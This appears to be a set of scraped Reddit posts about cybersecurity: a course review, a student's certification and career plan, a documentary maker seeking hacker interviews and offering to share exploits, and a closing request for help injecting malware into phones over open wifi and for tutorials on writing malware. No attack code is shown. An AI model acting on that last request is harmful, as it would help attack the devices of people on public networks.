Additionally, some of provided knowledges (such as Shellcoding or Buffer Overflow) are totally enabling to other Security advanced certifications and topics. - **SELF-SUFFICIENT:** No particular previous knowledge is required. The course does not take anything for granted and effectively explain all requirements needed to completely understand discussed topics with an impressive level of detail. The overall feeling is that nothing is there for no reason. - **PRACTICAL:** Labs, labs, labs and labs again. Paper-Security is not effective if not put into practice. What did Beckett say? Ever tried. Ever failed. No matter. Try Again. Fail again. Fail better. - **APPEALING:** The course offers a perfect balance between text and graphics, in the idea that visual representation is a better way to pin concepts than hundreds of words. Between the infinity of tools and certifications, I will always remember eCPPT course as the first true step I have taken in my professional career. What really gave me the self-confidence to try mastering this complex and deep subject. Security is all about knowledge and experience. Mostly important, security is a method where everyone can give a real contribution in his own way. No shortcuts. No definite roads. Only knowledge and confidence. Do not take anything for granted; deepen, contaminate, learn, trust in yourself, with a clear idea of the direction you intend to take. It wont be easy. You can decide to give up or try. Your choice."

And I apologize for the long post in advance, but I really need your help, as my whole future depends on your help, and this important post. I am interested in Information Security, in fact, I have a strong passion in it, and that's why I chose IT Security over Medicine, Passion over Money/Prestigious. So I decided to make it my job field. I am enrolled in a Computer science program in a university, 1 month and 12 days left for it to start. I plan to have a master degree in CyberSecurity/IT Security if it's worth it. I have prior experience in hacking some machines, but nothing major, I was just a script kiddie unfortunately. And as I want to be a professional hacker/penetration tester, I am building the right strong skillset, including programming, networking, operation systems...before I start hacking any machine, or studying any security related degree/certification. I reached the part of my plan where I learn networking, my plan was like this: Network+ &gt; CCENT &gt; CCNA R&amp;S. I was planning to study them now, and take the exams in my last university year. The main reason I wanted to have those certification (or the CCNA R&amp;S) in my resume is to approve that I understand networking. So, I got the ""CompTIA Network+ All-In-One Exam Guide, Sixth Edition(Exam N10-006)"" Mike Meyer's book, and got shocked by how much information is need to be memorized in order to pass the exam, and understanding that information (which is the only needed in the real world field) isn't enough to. And, this is just the basic network+ cert., so the CCNA R&amp;S has much more to memorize (probably 1000+ pages). Also, all that memorization is not needed in the security/hacking field, I just need to understand TCP/IP, know how to pivot, understand wireshark, understand how firewalls work..I don't need to know how to configure 100+ switches with 30+ firewalls, and some load balancers, that is the networking man job. I understand that to hack a network protected using a firewall, and an IPS for example, i need to understand both of them in order to hack it, and that's what I am gonna do, I want to understand and memorize what's needed for hacking, but not 4000+ pages of networking at least. And i am gonna deploy that practically in labs. I am gonna configure switches, routers, firewalls, IPS &amp; IDS.., but I am not gonna memorize tons of things, just to pass a certification, that I am not gonna use, neither in the job, nor in my own hacking journey. Then, I kept thinking, is studying them using ""books maybe + cybrary + labs -packet tracer, virtual networks using vmware workstation-"" enough to fill this gap ? I checked indeed.com to see some job posts, and what they require, and no one required having those certifications, just a few required understanding TCP/IP. This same thing applies to Microsoft, and Red Hat, I planned to get some of their certifications, to approve that I understand Windows and Linux, but i think there is no need anymore. I can self-study them without getting a certification, for my knowledge base only, and focus on the security certifications, so I can now achieve the CEH (just to pass the HR), OSCP, maybe elearnsecurity (their courses are good, but their certifications are not well known unfortunately, so I don't know if it will help me getting a good job), and much more. And I thought, doesn't achieving OSCP approve that I understand the needed knowledge to do a penetration test ? Such as TCP/IP understanding, wireshark, linux, windows, scripting...as this knowledge is required to pass it! So, I can approve it to the employer this way. So now, I can achieve some important security certifications within my bachelor years, then I can join a master security degree if it's worth it (in USA or EUROPE) OR I will get a good security-related job immediately after graduation (I don't study in USA or Europe currently, but I would like to work there, as the people there appreciate Information Security much more than here), and then, I will start harvesting SANS certifications -i wish i can afford them on my own now-, and after some years, I will get the CISSP, and maybe then I can work as a CISO! Which is my goal, to be a CISO (As I know, it's the most paying and prestigious job in this field). In the same time, I will study security books as much as I can, I will build my own lab, I will use vulnerable machines such as the vulnhub's ones, i will use ctf365.com, I will stay up to date with security news and vulnerabilities, I will donate to penetration test local companies, i will attend CTFs, conferences, and bug bounty programs, I MAY make a blog, and I will do my best to fill up my resume (I will make a seperate post to gather as much as possible on what things can help my resume). You may ask, why did I post this if I already made my decision ? I didn't. I am still worried what is the right thing to do, that's why I need your help. I don't know what is better. I don't know if my path will work or not. I apologize for the long post. I hope you answer my following questions, and I appreciate any additional advice and suggestions. I hope you correct and direct me to the right path. My whole future depends on your help. 1. Can I get a security-related job immediately after graduation (I mean my first job is security-related one) with a CS BA degree, CEH cert., OSCP cert., and the self-study stuff that can be put on the resume (such as: books, online courses, achievements, donations, a blog, CTFs, conferences, bug bountry programs...) ? 2. Is my plan/path realistic ? 3. Can the CISO level be achieved this path ? (I think I need a management/Business certification to be a CISO) 4. Additional notes, advice, and suggestions are appreciated. Thanks in advance. -LonVenu | Reddit"

I'll get back to you soon if I haven't. For an art project, I am producing a documentary on hacking, the Internet / the Deep Web, and their surrounding culture. I'm a pretty decent programmer, so I am putting very technical scenes in the film, including demonstrating live examples of working exploits I've found and going in-depth to how the code works. Along with the security demos, animations, news clips, and other footage, I am trying to get interviews from a variety of sources: Cybersecurity experts, black hat / grey hat hackers, victims of hacking / phishing / social media theft, experienced Deep Web users, and also informed Internet users with something to say on any of the subjects. You can be anonymous if you'd like to (It's almost encouraged, as I will be remaining anonymous in the film too), and I can offer up some services that could be pretty beneficial depending on your situation. For example, if you were a victim of a hacking, phishing, etc. attempt, then I'd do some investigation on how you made yourself vulnerable, who could have targeted you, and how to prevent it in the future. If you're a grey hat hacker, I could share with you some of the working exploits and scripts I've written myself. Or I could just buy you a nice dinner during or after the interview! Please let me know on here through PMs, or email me, at the.web.the.film@gmail.com. If you're a grey / black hat, then you can email my ProtonMail account: anon705693@protonmail.com I live in NYC, so if you were anywhere around, that'd be great so I can get live footage. Otherwise, a Skype interview or even a phone call would be good! Thanks for reading. When the film is finished, I plan on releasing it on YouTube for free, as well as submitting it to a few film festivals. I'm willing to travel anywhere within a few hours of NYC to interview! Hope that the film will provide a compelling and insightful look into the Internet, hacking, and Internet culture, and that the research presented will be beneficial in promoting cybersecurity protection and digital privacy."

Added to the fact that all your doing is looking at a computer all day sounds very boring. One person said it was a ""realistic"" career path but I REALLY love music and making music. I'm trying to find a Cybersecurity expert to shadow but It's difficult. I need help. Anybody?"

We would like to do a project involving injecting malware over open wifi from a smart phone(preferably android). Is this a feasible option? Is it overly difficult, or is it possible with the tools (like kali) at my disposal? I also would like any tutorial on creating your own malware, as it would help immensely (hopefully, we will create a publication with this talking about injecting malware over a wifi network). I got this idea from one of the theories behind the fappening (I know, I know). I would really like to test this and don't really know where to start."
